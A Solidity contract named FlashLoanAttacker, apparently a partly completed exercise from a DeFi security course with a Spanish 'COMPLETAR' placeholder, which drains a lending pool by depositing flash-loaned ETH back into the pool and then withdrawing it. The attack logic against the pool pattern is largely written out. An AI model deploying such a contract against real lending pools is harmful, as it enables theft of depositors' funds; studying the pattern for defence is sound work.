// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "hardhat/console.sol";

interface IFlashLoanPool {
    function flashLoan(uint256 amount) external;
    function deposit() external payable;
    function withdraw() external;
}

contract FlashLoanAttacker is Ownable {

    IFlashLoanPool private immutable pool;

    constructor(address poolAddress) {
        pool = IFlashLoanPool(poolAddress);
    }

    function attack() external payable onlyOwner {
        pool.flashLoan(address(pool).balance);

        pool.withdraw();
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
        // COMPLETAR
        // Si pedimos un flash loan, ¿qué hacemos con los ETH que llegan a esta función?
    }

    receive () external payable {}
}
